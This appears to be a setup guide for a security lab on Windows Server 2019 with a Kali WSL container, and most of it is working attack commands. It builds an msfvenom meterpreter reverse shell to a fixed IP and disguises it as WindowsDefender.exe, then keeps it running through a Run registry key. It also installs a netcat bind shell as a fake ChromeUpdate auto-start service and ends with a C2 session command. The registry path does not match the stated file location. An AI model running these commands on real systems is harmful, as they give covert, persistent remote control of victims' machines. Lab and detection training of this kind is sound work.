# Installation

- [Installation](#installation)
  - [Setup](#setup)
  - [Install Kali Container](#install-kali-container)
  - [Artifact 1: Reverse Shell in Registry](#artifact-1-reverse-shell-in-registry)
    - [Kali Linux](#kali-linux)
    - [Windows](#windows)
  - [Artifact 2: Bind Shell service](#artifact-2-bind-shell-service)
    - [Kali Linux](#kali-linux-1)
    - [Windows](#windows-1)
  - [C2](#c2)

---

## Setup

The VM is using the **Windows Server 2019 with Container**.

<br/>

---

## Install Kali Container

First download **Kali Linux** and **Ubuntu 20.04** from the following site:

- https://docs.microsoft.com/en-us/windows/wsl/install-manual

<br/>

Run `powershell.exe` as admin and execute the following command:

```
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
```

<br/>

Extract `<distro>.appx` using Powershell:

```
Rename-Item .\kali.appx .\kali.zip
Expand-Archive .\kali.zip .\kali
cd .\kali
Rename-Item .\Distro.....-amd64.appx .\kali.zip
Expand-archive .\kali.zip .\kali
cd .\kali
```

<br/>

Then run kali:

```
.\kali.exe
```

<br/>

Get the keyring deb link from https://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2020.2_all.deb.

```
wget https://http.kali.org/kali/pool/main/k/kali-archive-keyring/kali-archive-keyring_2020.2_all.deb
sudo apt install .\kali-archive-keyring_2020.2_all.deb
```

<br/>

Update packages:

```
apt update -y && apt upgrade -y && apt dist-upgrade -y
apt install kali-linux-core -y
```

<br/>

---

## Artifact 1: Reverse Shell in Registry

### Kali Linux

Prepare a reverse shell using `msfvenom` on Kali Linux:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.31.15.180 LPORT=4444 -f exe > WindowsDefender.exe
```

<br/>

Shift this on the Windows host `C:\Windows\System32\WindowsDefender.exe`

<br/>

### Windows

Open `cmd.exe` and run:

```
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefender /t REG_SZ /d "C:\Program Files\Defender\WindowsDefender.exe"
```

<br/>

---

## Artifact 2: Bind Shell service

### Kali Linux

Copy the `nc.exe` in `/usr/share/windows-binaries/nc.exe` to the Windows host `C:\ProgramData\Chrome\ChromeUpdate.exe`.

<br/>

### Windows

Create a service and start the service:

```
sc create ChromeUpdateService binpath= "cmd.exe /k C:\ProgramData\Chrome\ChromeUpdate.exe -L -p 2222 -e cmd.exe" start= auto
```

<br/>

---

## C2

Kali:

```
sessions -c "msg administrator hello"
```